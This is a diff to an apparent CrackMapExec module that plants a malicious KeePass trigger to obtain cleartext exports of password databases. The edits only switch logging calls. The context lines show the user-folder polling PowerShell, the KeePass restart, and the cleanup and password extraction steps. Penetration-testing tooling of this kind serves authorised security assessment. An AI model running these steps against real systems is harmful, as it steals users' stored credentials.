@@ -127,10 +127,10 @@ class CMEModule:
 
         # check if the specified KeePass configuration file exists
         if self.trigger_added(context, connection):
-            context.log.info('The specified configuration file already contains a trigger called "{}", skipping'.format(self.keepass_config_path, self.trigger_name))
+            context.log.display('The specified configuration file already contains a trigger called "{}", skipping'.format(self.keepass_config_path, self.trigger_name))
             return
 
-        context.log.info('Adding trigger "{}" to "{}"'.format(self.trigger_name, self.keepass_config_path))
+        context.log.display('Adding trigger "{}" to "{}"'.format(self.trigger_name, self.keepass_config_path))
 
         # prepare the trigger addition script based on user-specified parameters (e.g: trigger name, etc)
         # see data/keepass_trigger_module/AddKeePassTrigger.ps1 for the full script
@@ -163,9 +163,9 @@ class CMEModule:
         """check if the trigger is added to the config file XML tree"""
 
         if self.trigger_added(context, connection):
-            context.log.info('Malicious trigger "{}" found in "{}"'.format(self.trigger_name, self.keepass_config_path))
+            context.log.display('Malicious trigger "{}" found in "{}"'.format(self.trigger_name, self.keepass_config_path))
         else:
-            context.log.info('No trigger "{}" found in "{}"'.format(self.trigger_name, self.keepass_config_path))
+            context.log.display('No trigger "{}" found in "{}"'.format(self.trigger_name, self.keepass_config_path))
 
     def restart(self, context, connection):
         """Force the restart of KeePass process using a Windows service defined using the powershell script RestartKeePass.ps1
@@ -204,7 +204,7 @@ class CMEModule:
             context.log.error('Multiple KeePass processes were found, please specify parameter USER to target one')
             return
 
-        context.log.info("Restarting {}'s KeePass process".format(keepass_users[0]))
+        context.log.display("Restarting {}'s KeePass process".format(keepass_users[0]))
 
         # prepare the restarting script based on user-specified parameters (e.g: keepass user, etc)
         # see data/keepass_trigger_module/RestartKeePass.ps1
@@ -227,8 +227,8 @@ class CMEModule:
     def poll(self, context, connection):
         """Search for the cleartext database export file in the specified export folder (until found, or manually exited by the user)"""
         found = False
-        context.log.info('Polling for database export every {} seconds, please be patient'.format(self.poll_frequency_seconds))
-        context.log.info('we need to wait for the target to enter his master password ! Press CTRL+C to abort and use clean option to cleanup everything')
+        context.log.display('Polling for database export every {} seconds, please be patient'.format(self.poll_frequency_seconds))
+        context.log.display('we need to wait for the target to enter his master password ! Press CTRL+C to abort and use clean option to cleanup everything')
         # if the specified path is %APPDATA%, we need to check in every user's folder
         if self.export_path == '%APPDATA%' or self.export_path == '%appdata%':
             poll_export_command_str = 'powershell.exe "Get-LocalUser | Where {{ $_.Enabled -eq $True }} | select name | ForEach-Object {{ Write-Output (\'C:\\Users\\\'+$_.Name+\'\\AppData\\Roaming\\{}\')}} | ForEach-Object {{ if (Test-Path $_ -PathType leaf){{ Write-Output $_ }}}}"'.format(self.export_name)
@@ -281,11 +281,11 @@ class CMEModule:
         # deletes every export found on the remote machine
         if self.export_name in poll_export_command_output:
             for export_path in poll_export_command_output.split('\r\n'):  # in case multiple exports found (may happen if several users exported the database to their APPDATA)
-                context.log.info('Database export found in "{}", removing'.format(export_path))
+                context.log.display('Database export found in "{}", removing'.format(export_path))
                 remove_export_command_str = 'powershell.exe Remove-Item {}'.format(export_path)
                 connection.execute(remove_export_command_str, True)
         else:
-            context.log.info('No export found in {} , everything is cleaned'.format(self.export_path))
+            context.log.display('No export found in {} , everything is cleaned'.format(self.export_path))
 
         # if the malicious trigger was not self-deleted, deletes it
         if self.trigger_added(context, connection):
@@ -311,7 +311,7 @@ class CMEModule:
             if self.trigger_added(context, connection):
                 context.log.error('Unknown error while removing trigger "{}", exiting'.format(self.trigger_name))
             else:
-                context.log.info('Found trigger "{}" in configuration file, removing'.format(self.trigger_name))
+                context.log.display('Found trigger "{}" in configuration file, removing'.format(self.trigger_name))
         else:
             context.log.success('No trigger "{}" found in "{}", skipping'.format(self.trigger_name, self.keepass_config_path))
 
@@ -324,11 +324,11 @@ class CMEModule:
         self.restart(context, connection)
         self.poll(context, connection)
         context.log.highlight("")
-        context.log.info('Cleaning everything..')
+        context.log.display('Cleaning everything..')
         self.clean(context, connection)
         self.restart(context, connection)
         context.log.highlight("")
-        context.log.info('Extracting password..')
+        context.log.display('Extracting password..')
         self.extract_password(context)
 
     def trigger_added(self, context, connection):
